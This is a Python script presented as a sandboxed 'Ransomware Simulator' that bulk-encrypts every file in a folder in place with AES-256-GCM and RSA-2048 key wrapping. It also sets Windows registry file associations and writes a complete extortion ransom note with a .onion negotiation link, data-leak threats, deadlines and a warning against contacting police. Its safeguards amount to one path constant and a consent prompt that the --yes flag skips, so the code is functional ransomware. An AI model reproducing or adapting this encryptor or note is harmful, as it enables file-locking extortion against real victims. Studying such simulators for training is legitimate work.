"""Hybrid encryption demo (safe, consent-based, sandbox-only).

This script demonstrates envelope encryption using:
- AES-256-GCM for file data
- RSA-2048 OAEP-SHA256 for wrapping the AES key

Safety boundaries:
- Hybrid Encryption Lab (Bulk Version).
- Requires explicit user confirmation text.
- Refuses paths outside C:\\RansomLab\\sandbox.
"""

from __future__ import annotations

import argparse
import os
import ctypes
import time
from datetime import datetime
from pathlib import Path

# Standard Windows Registry access
try:
    import winreg
except ImportError:
    winreg = None

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Configuration
SANDBOX_PATH = Path(r"C:\RansomLab\sandbox")
KEYS_DIR = SANDBOX_PATH / "keys"
PUBLIC_KEY_PATH = KEYS_DIR / "public_key.pem"
# Store the private key outside the sandbox so only the public key remains there.
PRIVATE_KEY_PATH = Path(__file__).resolve().with_name("private_key.pem")
LOG_PATH = SANDBOX_PATH / "hybrid_demo.log"
LOGO_PATH = Path(__file__).resolve().with_name("logo.png")

ENCRYPTED_EXT = ".hyenc"
FILE_MAGIC = b"HYBDEMO1"
NONCE_SIZE = 12
        
        
# Utility and Safety Functions

def log(message: str) -> None:
    """Print and append a timestamped message to the sandbox log file."""
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{stamp}] {message}"
    print(line)

    try:
        if SANDBOX_PATH.exists() and SANDBOX_PATH.is_dir() and is_within_sandbox(LOG_PATH):
            with LOG_PATH.open("a", encoding="utf-8") as handle:
                handle.write(line + "\n")
    except OSError:
        pass


def is_within_sandbox(path: Path) -> bool:
    """Allow only paths whose resolved location is inside the sandbox root."""
    try:
        sandbox_resolved = SANDBOX_PATH.resolve(strict=False)
        path_resolved = path.resolve(strict=False)
        common = Path(os.path.commonpath([str(sandbox_resolved), str(path_resolved)]))
        return common == sandbox_resolved
    except ValueError:
        return False


def validate_sandbox() -> None:
    """Ensure sandbox exists and is a directory before any crypto operation."""
    if not SANDBOX_PATH.exists():
        raise RuntimeError(f"Sandbox path not found: {SANDBOX_PATH}")
    if not SANDBOX_PATH.is_dir():
        raise RuntimeError(f"Sandbox path is not a directory: {SANDBOX_PATH}")


def assert_safe_file_path(path: Path) -> None:
    """Reject file paths outside sandbox or directory paths."""
    if not is_within_sandbox(path):
        raise RuntimeError(f"Blocked path outside sandbox: {path}")
    if path.is_dir():
        raise RuntimeError(f"Expected a file but received a directory: {path}")

# --- Icon Logic (winreg scope) ---

# Windows Registry integration for .hyenc file association with logo.png
def set_file_association():
    """Registers .hyenc files in the Windows Registry to use logo.png."""
    if not winreg or not LOGO_PATH.exists():
        log("Registry update skipped: logo.png not found or not on Windows.")
        return

    prog_id = "5H4D0W_1NC.Files"
    icon_path = str(LOGO_PATH)

    try:
        # 1. Create the ProgID and set the icon
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{prog_id}") as key:
            winreg.SetValue(key, "", winreg.REG_SZ, "5H4D0W_1NC Encrypted File")
        
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{prog_id}\DefaultIcon") as key:
            winreg.SetValue(key, "", winreg.REG_SZ, icon_path)

        # 2. Associate the .hyenc extension with that ProgID
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{ENCRYPTED_EXT}") as key:
            winreg.SetValue(key, "", winreg.REG_SZ, prog_id)

        # 3. Notify Windows Shell to refresh icons
        ctypes.windll.shell32.SHChangeNotify(0x08000000, 0, None, None)
        log("Windows Registry updated: .hyenc files now use the group logo.")
    except Exception as e:
        log(f"Failed to set file association: {e}")
    
        
# --- Registry Cleanup Integration ---

def remove_file_association():
    """Removes the .hyenc association from the Windows Registry."""
    if not winreg:
        return

    extension = ".hyenc"
    prog_id = "5H4D0W_1NC.Files"

    try:
        # 1. Delete the extension association
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{extension}")
        except OSError: pass # Key already gone

        # 2. Delete the ProgID and its DefaultIcon subkey
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{prog_id}\DefaultIcon")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{prog_id}")
        except OSError: pass

        # 3. Force Windows to refresh the icons back to normal
        ctypes.windll.shell32.SHChangeNotify(0x08000000, 0, None, None)
        log("Windows Registry cleaned: .hyenc icons removed.")
    except Exception as e:
        log(f"Failed to remove file association: {e}")       
        



# Demo Functions

def print_banner() -> None:
    """Display simulator banner with ASCII art."""
    banner = """
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗██╗    ██╗██╗  ██╗███████╗██████╗ ███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██║    ██║██║  ██║██╔════╝██╔══██╗██╔════╝
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║██║ █╗ ██║███████║█████╗  ██████╔╝█████╗  
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██║███╗██║██╔══██║██╔══╝  ██╔══██╗██╔══╝  
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║╚███╔███╔╝██║  ██║███████╗██║  ██║███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝

███████╗██╗███╗   ███╗██╗   ██╗██╗      █████╗ ████████╗ ██████╗ ██████╗ 
██╔════╝██║████╗ ████║██║   ██║██║     ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
███████╗██║██╔████╔██║██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝
╚════██║██║██║╚██╔╝██║██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
███████║██║██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⡈⠐⠠⢁⠂⠐⢀⣾⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠿⣷⡄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⠠⢁⠂⠄⠀⣛⠀⡟⢁⣠⣄⠀⠀⠀⠙⢻⡟⠉⠀⠀⢀⣴⣦⣬⠃⣬⣅⠀⢂⠐⡀⢂⠐⠠⠀⠄⠠⠀⠄⠠⢀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡁⢂⠈⠀⠾⡛⢱⡿⢿⣿⣿⣿⣦⣄⣠⣼⣷⣤⣤⣶⠿⠿⢿⣟⠆⢉⡛⠆⠀⢂⠐⠠⠈⠄⠡⠈⠄⠡⢈⠐⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡐⢀⠂⢠⣾⡟⣸⣰⡿⠁⠀⠀⠙⣿⡇⣿⣿⠸⣿⠁⢀⣀⣀⣙⡸⠎⢿⡆⠀⠂⠌⠠⠁⠌⠠⠁⠌⡐⢀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⠀⠟⡸⢛⣤⣼⣿⣿⣿⣤⣼⠇⣿⣿⠀⢧⣿⣿⣿⣿⣿⣿⣧⣄⠃⠀⢃⠘⡀⢃⠘⡀⠃⠄⠠⢀⠘⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢂⠡⠈⠄⢈⡾⠋⢹⣿⣿⣿⣿⡟⢡⣴⣿⣿⣷⣦⡙⢿⣿⣿⣿⣿⠀⠙⠀⠈⡀⢂⠐⡀⠂⠄⠡⢈⠐⡀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠄⢂⠡⠀⢸⠀⠀⢸⣿⣿⣿⣿⡀⣿⣿⣿⣿⣿⣿⡇⠸⢿⣿⣿⡟⠀⠀⠀⠀⡐⢀⠂⠄⠡⢈⠐⡀⢂⠐⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠄⡐⠠⠀⠀⠀⠀⠙⠋⠉⠀⠀⠉⠉⠙⠛⠋⠉⠀⠀⠀⠀⠁⠀⠀⠀⠀⢀⠐⠠⠈⠄⡁⢂⠐⡀⠂⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢈⠐⠠⠁⠄⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⢀⣀⠀⠀⢀⠂⠌⠠⢁⠂⡐⢀⠂⠄⠡⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠈⠄⠡⢈⠐⡀⠸⣿⣦⡀⠀⠀⠛⠒⠚⠛⠛⠛⠛⠀⢀⣴⣿⠃⠀⠌⡀⠂⠌⡐⢀⠂⡐⠠⠈⠄⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠡⢈⠐⡀⠂⠄⠀⢻⣿⣿⣷⣶⣦⣤⣤⣤⣤⣤⣶⣾⣿⣿⡿⠀⠐⠠⢀⠁⢂⠐⡀⠂⠄⠡⢈⠐⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⡐⢀⠂⠄⠡⠈⠄⠘⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⡿⠃⠀⠌⡐⠠⠈⠄⠂⠄⠡⢈⠐⠠⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡐⠠⠈⠄⠡⢈⠐⠀⠀⠙⠃⣿⣿⣿⣿⣿⣿⣿⣿⡗⠋⠀⣤⠀⠀⠀⠡⠈⠄⠡⢈⠐⠠⠈⠄⡁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠄⠡⠈⠄⡁⠂⠀⠀⣤⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⠇⣠⣾⣿⠀⣰⠀⠀⠀⣈⡀⠀⠈⠀⠁⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡈⠄⠁⠂⠀⠀⠀⠀⢻⣿⣷⠬⠉⠉⠉⠉⠉⠉⠀⠚⢿⣿⣿⢀⣿⡀⠀⠀⢹⣿⣿⣿⣿⣶⡶⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⢸⣧⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣾⣿⡇⠀⠁⠀⢻⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣟⡿⠀⠀⠀⠀⣿⣿⣦⠘⣿⣶⠖⣠⠆⠀⠀⢳⣤⡙⢿⣟⣼⣿⣿⡇⠀⠐⡀⠈⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⠃⠀⠀⠀⠀⢿⣿⣿⣷⣌⣿⣾⠏⠀⡀⠀⠸⡿⠿⠾⠿⠿⠿⠿⠷⠀⠀⠄⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢠⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⢠⠀⡄⣴⠀⠀⡄⠐⠀⠀⢻⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠠⠀⠀⠀⠀⢀⠀⠠⠀⠄⢂⠐⠠⢈⠐⡈⠐⡀⢂⠐⠘⢷⡭⠂⠄⡁⢂⠀⠈⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⠐⠠⠈⡐⠠⠈⠄⠡⠈⠄⡈⠐⡀⠂⠄⠡⠐⠠⠨⠄⠆⠠⠌⠠⠐⠠⢀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡿⠿⠿⠀⣼⡿⠿⣿⡆⢠⣿⠿⢿⣷⠀⣼⡿⠿⣿⡆⢸⣿⠀⣿⡿⠿⠿⠀⠾⢿⣿⠿⠇⠘⣿⡄⣰⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣧⣤⡄⠀⢿⣧⣤⣤⡁⢨⣿⠀⢀⣿⠀⣿⡇⠀⠀⠁⢸⣿⠀⣿⣧⣤⡄⠀⠀⢸⣿⠀⠀⠀⠘⢿⣿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡏⠁⠁⠀⣤⣍⣈⣿⡇⢸⣿⣀⣀⣿⠀⣿⣇⣀⣤⡄⢸⣿⠀⣿⣇⣉⣀⠀⠀⢸⣿⠀⠀⠀⠀⢸⣯⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠛⠃⠀⠀⠀⠙⠛⠛⠛⠁⠀⠛⠛⠛⠋⠀⠘⠛⠛⠛⠁⠘⠛⠀⠛⠛⠛⠛⠀⠀⠘⠛⠀⠀⠀⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    print(banner)

def require_consent(force_yes: bool) -> None:
    """Require explicit operator acknowledgment unless --yes is provided."""
    if force_yes:
        return

    print("This demo will operate on files inside the sandbox only.")
    answer = input("Type I AGREE to continue: ").strip()
    if answer != "I AGREE":
        raise RuntimeError("Consent not provided. Aborting.")

# Core Cryptography Logic

def generate_rsa_keypair() -> None:
    """Generate RSA-2048 keypair with the public key in sandbox and private key outside it."""
    validate_sandbox()
    KEYS_DIR.mkdir(parents=True, exist_ok=True)

    if not is_within_sandbox(PUBLIC_KEY_PATH):
        raise RuntimeError("Refusing to write public key outside sandbox")
    if is_within_sandbox(PRIVATE_KEY_PATH):
        raise RuntimeError("Private key must be stored outside the sandbox")

    PRIVATE_KEY_PATH.parent.mkdir(parents=True, exist_ok=True)

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    PRIVATE_KEY_PATH.write_bytes(private_pem)
    PUBLIC_KEY_PATH.write_bytes(public_pem)
    log(f"Generated keypair: {PUBLIC_KEY_PATH} | {PRIVATE_KEY_PATH}")


def load_public_key(path: Path):
    """Load RSA public key from PEM file."""
    assert_safe_file_path(path)
    return serialization.load_pem_public_key(path.read_bytes())


def load_private_key(path: Path):
    """Load RSA private key from PEM file."""
    if path.is_dir():
        raise RuntimeError(f"Expected a file but received a directory: {path}")
    return serialization.load_pem_private_key(path.read_bytes(), password=None)


def encrypt_file_hybrid(input_file: Path, public_key_file: Path) -> None:
    """
    Encrypt files using AES-256-GCM and wrap the AES key with RSA-2048.

    Output format:
    - magic(8)
    - wrapped_key_len(2)
    - nonce(12)
    - wrapped_key(variable)
    - ciphertext_and_tag(variable)
    """
    validate_sandbox()
    assert_safe_file_path(input_file)
    assert_safe_file_path(public_key_file)

    if not input_file.exists():
        raise RuntimeError(f"Input file not found: {input_file}")
    if input_file.suffix == ENCRYPTED_EXT:
        raise RuntimeError(f"Input already appears encrypted: {input_file}")

    output_file = input_file.with_name(input_file.name + ENCRYPTED_EXT)
    assert_safe_file_path(output_file)

    if output_file.exists():
        raise RuntimeError(f"Refusing to overwrite existing encrypted file: {output_file}")

    public_key = load_public_key(public_key_file)
    plaintext = input_file.read_bytes()

    aes_key = AESGCM.generate_key(bit_length=256)
    nonce = os.urandom(NONCE_SIZE)
    ciphertext = AESGCM(aes_key).encrypt(nonce, plaintext, None)

    wrapped_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    if len(wrapped_key) > 65535:
        raise RuntimeError("Wrapped key too large for demo file format")

    header = FILE_MAGIC + len(wrapped_key).to_bytes(2, "big") + nonce

    # In-place behavior: write encrypted blob to the original file, then rename to .hyenc.
    input_file.write_bytes(header + wrapped_key + ciphertext)
    input_file.rename(output_file)
    log(f"Encrypted one file in place: {input_file} -> {output_file}")
    return output_file


def decrypt_file_hybrid(encrypted_file: Path, private_key_file: Path) -> None:
    """Decrypt one .hyenc file and restore original name/content in place."""
    validate_sandbox()
    assert_safe_file_path(encrypted_file)
    if not private_key_file.exists():
        raise RuntimeError(f"Private key not found: {private_key_file}")
    if private_key_file.is_dir():
        raise RuntimeError(f"Expected a file but received a directory: {private_key_file}")

    if not encrypted_file.exists():
        raise RuntimeError(f"Encrypted file not found: {encrypted_file}")
    if encrypted_file.suffix != ENCRYPTED_EXT:
        raise RuntimeError(f"Expected a {ENCRYPTED_EXT} file: {encrypted_file}")

    blob = encrypted_file.read_bytes()
    min_header = len(FILE_MAGIC) + 2 + NONCE_SIZE
    if len(blob) < min_header:
        raise RuntimeError("File too small to contain valid hybrid header")

    if blob[: len(FILE_MAGIC)] != FILE_MAGIC:
        raise RuntimeError("Invalid file magic; not a supported demo file")

    wrapped_len = int.from_bytes(blob[len(FILE_MAGIC): len(FILE_MAGIC) + 2], "big")
    nonce_start = len(FILE_MAGIC) + 2
    nonce_end = nonce_start + NONCE_SIZE
    wrapped_start = nonce_end
    wrapped_end = wrapped_start + wrapped_len

    if wrapped_end > len(blob):
        raise RuntimeError("Invalid wrapped key length in file header")

    nonce = blob[nonce_start:nonce_end]
    wrapped_key = blob[wrapped_start:wrapped_end]
    ciphertext = blob[wrapped_end:]

    private_key = load_private_key(private_key_file)
    aes_key = private_key.decrypt(
        wrapped_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    plaintext = AESGCM(aes_key).decrypt(nonce, ciphertext, None)

    original_name = encrypted_file.name[: -len(ENCRYPTED_EXT)]
    output_file = encrypted_file.with_name(original_name)
    assert_safe_file_path(output_file)

    if output_file.exists():
        raise RuntimeError(f"Refusing to overwrite existing restored file: {output_file}")

    # In-place behavior: write plaintext to the .hyenc file, then restore original filename.
    encrypted_file.write_bytes(plaintext)
    encrypted_file.rename(output_file)
    log(f"Decrypted one file in place: {encrypted_file} -> {output_file}")
    return output_file


# --- Bulk Orchestration ---

def run_bulk_operation(mode: str, key_path: Path) -> None:
    validate_sandbox()

    # Walk sandbox
    for file_path in SANDBOX_PATH.rglob("*"):
        if not file_path.is_file(): continue
        
        # Safety exclusions
        if KEYS_DIR in file_path.parents or file_path == LOG_PATH or file_path.name in ["note.txt", "desktop.ini"]:
            continue

        try:
            if mode == "encrypt" and file_path.suffix != ENCRYPTED_EXT:
                encrypt_file_hybrid(file_path, key_path)
                set_file_association()
                time.sleep(0.75)  # Delay between files for realistic effect                
            elif mode == "decrypt" and file_path.suffix == ENCRYPTED_EXT:
                decrypt_file_hybrid(file_path, key_path)
                remove_file_association()
                time.sleep(0.75)  # Delay between files for realistic effect  
        except Exception as e:
            log(f"Failed processing {file_path.name}: {e}")

    if mode == "encrypt":
        create_ransom_note()
    if mode == "decrypt":
        note_path = SANDBOX_PATH / "note.txt"
        if note_path.exists():
            note_path.unlink()
            log("Ransom note removed.")

def create_ransom_note() -> None:
    """Create a note.txt file in the sandbox with encryption information."""
    validate_sandbox()
    note_file = SANDBOX_PATH / "note.txt"
    content = (
    "::: 5H4D0W_1NC LOCKER ::: \n"
    "\n"
    "!!! ALL YOUR FILES ARE ENCRYPTED !!!\n"
    "\n"
    "Hello,\n"
    "\n"
    "If you are reading this message, it means your company's network has been breached \n"
    "and all your data has been encrypted by \"5H4D0W_1NC\" group. \n"
    "\n"
    "WHAT HAPPENED?\n"
    "We have exploited vulnerabilities in your network infrastructure. All your servers, \n"
    "databases, and backups have been locked with military-grade encryption algorithms \n"
    "(AES-256 & RSA-2048). You cannot recover your files without our private key.\n"
    "\n"
    "DATA LEAK WARNING:\n"
    "Before encryption, we downloaded your confidential data . If you refuse to pay or do not contact us, this \n"
    "data will be published on our Tor blog for your competitors and regulators to see. \n"
    "\n"
    "HOW TO GET YOUR FILES BACK?\n"
    "We are not interested in destroying your business, we only want payment.\n"
    "You must purchase a unique decryption tool from us.\n"
    "\n"
    ">>> LEGAL & REPUTATION NOTICE (IMPORTANT):\n"
    "We have analyzed your files If you do not pay:\n"
    "1. We will send copies of this incriminating data directly to your GOVERNMENT \n"
    "   agencies and regulators to trigger an investigation against you.\n"
    "2. We will email your clients, business partners, and everyone in your CONTACT \n"
    "   LIST to inform them that you lost their data.\n"
    "\n"
    "INSTRUCTIONS:\n"
    "1. Download and install Tor Browser: https://www.torproject.org/\n"
    "2. Open Tor Browser and navigate to our chat portal:\n"
    "   http://oaptxiyisljt2kv3we2we34kuudmqda7f2geffoylzpeo7ourhtz4dad.onion/login.php\n"
    "3. Enter your Personal ID to start the negotiation\n"
    "(If the website is down or inaccessible, please try again after some time.)\n"
    "\n"
    "Your Personal ID:\n"
    "[snip]-shadow-KEY\n"
    "\n"
    "DEADLINE:\n"
    "You have 24 hours to contact us. After this, the price will double.\n"
    "If we do not hear from you within 48 hours, your data will be leaked permanently.\n"
    "\n"
    "ATTENTION:\n"
    "- Do not rename encrypted files.\n"
    "- Do not try to decrypt using third-party software (you may lose data forever).\n"
    "- Do not call the police or FBI (we will leak data immediately).\n"
    "\n"
    "-- 5H4D0W_1NC Team --\n"
)
    try:
        note_file.write_text(content, encoding="utf-8")
        log(f"Created ransom note: {note_file}")
    except OSError as e:
        log(f"Warning: Could not write ransom note: {e}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Safe sandbox-only hybrid crypto demo (AES-256 + RSA-2048)."
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    subparsers.add_parser("gen-keys", help="Generate RSA-2048 keypair in sandbox/keys.")

    encrypt_parser = subparsers.add_parser("encrypt", help="Encrypt files inside sandbox.")
    encrypt_parser.add_argument(
        "--public-key",
        default=str(PUBLIC_KEY_PATH),
        help="Path to RSA public key PEM (default: sandbox/keys/public_key.pem).",
    )
    encrypt_parser.add_argument("--yes", action="store_true", help="Skip interactive consent prompt.")

    decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt .hyenc files inside sandbox.")
    decrypt_parser.add_argument(
        "--private-key",
        default=str(PRIVATE_KEY_PATH),
        help="Path to RSA private key PEM (default: sandbox/keys/private_key.pem).",
    )
    decrypt_parser.add_argument("--yes", action="store_true", help="Skip interactive consent prompt.")

    args = parser.parse_args()

    try:
        if args.command == "gen-keys":
            print_banner()
            generate_rsa_keypair()
            return

        elif args.command in ["encrypt", "decrypt"]:
            require_consent(args.yes)
            key_path = Path(args.public_key) if args.command == "encrypt" else Path(args.private_key)
            run_bulk_operation(args.command, key_path)
            return
        
    except Exception as exc:
        log(f"ERROR: {exc}")
        raise SystemExit(1) from exc


if __name__ == "__main__":
    main()
